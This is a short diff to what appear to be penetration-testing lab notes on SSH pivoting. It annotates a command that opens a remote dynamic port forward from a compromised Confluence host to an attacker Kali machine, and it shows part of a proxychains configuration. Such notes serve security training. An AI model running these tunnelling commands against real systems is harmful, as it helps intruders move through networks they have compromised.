@@ -48,7 +48,7 @@ socks5 192.168.50.63 9999(remote compromised machine - confluence01)
 Remote Dynamic Port Forwarding:
 initiating an SSH connection from a remote compromised host(confluence to attacker machine)
 ```
-remote compromised machine(confluence01): ssh -N -R 9998 kali@192.168.118.4
+remote compromised machine(confluence01): ssh -N -R 9998 kali@192.168.118.4(attacker machine)(listening state)
 
 kali@kali(attacker machine):~$ tail /etc/proxychains4.conf
 #       proxy types: http, socks4, socks5, raw
